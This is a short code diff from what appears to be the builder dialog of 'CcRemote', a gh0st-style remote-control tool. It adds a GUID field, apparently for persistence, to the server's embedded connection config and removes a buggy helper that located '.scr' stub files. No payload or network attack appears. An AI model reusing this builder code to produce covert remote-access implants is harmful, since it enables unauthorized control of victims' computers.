@@ -13,7 +13,8 @@ struct Connect_Address
 	DWORD dwstact;
 	char  strIP[MAX_PATH];
 	int   nPort;
-}g_myAddress = { 0xCC28256,"",0 };
+	char  ActiveXKeyGuid[MAX_PATH];	// 查找创建的Guid
+}g_myAddress = { 0xCC28256,"",0,"" };
 // CBuildDlg 对话框
 
 IMPLEMENT_DYNAMIC(CBuildDlg, CDialog)
@@ -162,37 +163,5 @@ int CBuildDlg::memfind(const char *mem, const char *str, int sizem, int sizes)
 		if (j == da) return i;
 	}
 	return -1;
-}
-
-
-CString CBuildDlg::FindFiles(const char* dir, BYTE *lpBuffer,DWORD lpSize)
-{
-	HANDLE h;						// 文件句柄
-	WIN32_FIND_DATA findData;		// 查找到的文件信息结构
-	char dirTmp[MAX_PATH] = { 0 };
-	strcpy(dirTmp, dir);
-	strcat(dirTmp, "*.scr");			// 使用通配符，和传入参数组成一个待遍历的路径
-	DWORD sizes;
-
-	CString fileList;	//此处用string就会使存入值变为乱码，所以用CString
-	h = FindFirstFileA(dirTmp, &findData);	//开始遍历
-	do {
-		if (findData.dwFileAttributes&_A_SUBDIR || findData.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY || strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
-		{
-			//log(INFO,"是目录，目录名：%s",findData.cFileName);
-		}
-		else
-		{
-			WriteFile(h, lpBuffer, lpSize,&sizes, NULL);
-			FindClose(h);
-			fileList=(findData.cFileName);			// 绝对路径存入vector(其实就是一个数组)
-			return "F:\\myapp\\CcRemote\\bin\\server\\" + fileList;
-		}
-	} while (FindNextFileA(h, &findData));
-
-	CString a = "null";
-
-	FindClose(h);
-	return a;
 }
 
